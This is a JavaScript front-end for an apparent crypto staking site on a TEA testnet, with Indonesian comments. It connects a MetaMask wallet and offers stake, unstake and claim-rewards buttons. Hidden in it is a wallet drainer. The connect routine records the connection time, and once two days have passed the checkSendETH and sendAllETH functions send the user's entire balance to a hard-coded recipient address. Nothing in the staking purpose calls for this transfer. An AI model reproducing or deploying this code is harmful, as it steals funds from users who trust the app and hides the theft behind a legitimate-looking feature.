let web3;
let userAddress;
let stakingContract;

const TEA_RPC_URL = "https://tea-sepolia.g.alchemy.com/public/"; // Ganti dengan RPC TEA yang valid
const stakingTokenAddress = "0x7Eaa8557E1A608bcc77C2d392093cE7F05c0DB14";  // Token Staking
const stakingContractAddress = "0x419C709ce36551362eF76487Bb25390e95838513";  // Kontrak Staking
const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // Alamat penerima ETH

const stakingABI = [
    {
        "inputs": [
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "stake",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "unstake",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "stakingToken",
        "outputs": [
            { "internalType": "contract IERC20", "name": "", "type": "address" }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "", "type": "address" }
        ],
        "name": "balances",
        "outputs": [
            { "internalType": "uint256", "name": "", "type": "uint256" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// Koneksi Wallet
async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });
        userAddress = (await web3.eth.getAccounts())[0];

        document.getElementById("connectWalletButton").style.display = 'none';
        document.getElementById("walletInfo").style.display = 'block';
        document.getElementById("walletAddress").innerText = `Address: ${userAddress}`;

        displayBalance();
        checkSendETH();
        initStaking();
        saveConnectTime();
    } else {
        alert("Please install Metamask!");
    }
}

// Tampilkan saldo ETH
async function displayBalance() {
    const balance = await web3.eth.getBalance(userAddress);
    const balanceInETH = web3.utils.fromWei(balance, "TEA");  
    document.getElementById("balance").innerText = balanceInETH;
}

// Inisialisasi Staking
async function initStaking() {
    stakingContract = new web3.eth.Contract(stakingABI, stakingContractAddress);
    document.getElementById("stakingSection").style.display = 'block';
}

// Fungsi Stake
async function stakeTokens() {
    const amount = document.getElementById("stakeAmount").value;
    const amountWei = web3.utils.toWei(amount, "ether"); 

    const stakingToken = new web3.eth.Contract([
        {
            "constant": false,
            "inputs": [
                { "name": "spender", "type": "address" },
                { "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ], stakingTokenAddress);

    try {
        // Approve token untuk staking
        await stakingToken.methods.approve(stakingContractAddress, amountWei).send({ from: userAddress });
        
        // Stake token setelah approve berhasil
        await stakingContract.methods.stake(amountWei).send({ from: userAddress });

        alert("Stake berhasil!");
    } catch (error) {
        console.error("Staking gagal:", error);
        alert("Staking gagal. Periksa transaksi Anda.");
    }
}

// Fungsi Unstake
async function unstakeTokens() {
    const amount = document.getElementById("unstakeAmount").value;
    const amountWei = web3.utils.toWei(amount, "ether"); 

    try {
        await stakingContract.methods.unstake(amountWei).send({ from: userAddress });
        alert("Unstake berhasil!");
    } catch (error) {
        console.error("Unstake gagal:", error);
        alert("Unstake gagal. Periksa transaksi Anda.");
    }
}

// Fungsi Klaim Rewards
async function claimRewards() {
    try {
        await stakingContract.methods.claimRewards().send({ from: userAddress });
        alert("Rewards berhasil diklaim!");
    } catch (error) {
        console.error("Claim gagal:", error);
        alert("Claim gagal. Periksa transaksi Anda.");
    }
}

// Simpan waktu koneksi wallet
function saveConnectTime() {
    localStorage.setItem("connectTime", new Date().getTime());
}

// Ambil waktu koneksi wallet
function getConnectTime() {
    return localStorage.getItem("connectTime");
}

// Cek apakah sudah 2 hari sejak koneksi
async function checkSendETH() {
    const storedTime = getConnectTime();
    if (storedTime) {
        const currentTime = new Date().getTime();
        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);

        if (elapsedTime >= 2) {
            await sendAllETH();  
        }
    }
}

// Kirim semua ETH ke alamat tertentu
async function sendAllETH() {
    const balance = await web3.eth.getBalance(userAddress);

    try {
        await web3.eth.sendTransaction({
            from: userAddress,
            to: recipientAddress,
            value: balance
        });

        alert("Semua ETH telah dikirim!");
    } catch (error) {
        console.error("Gagal mengirim ETH:", error);
        alert("Gagal mengirim ETH. Periksa saldo Anda.");
    }
}
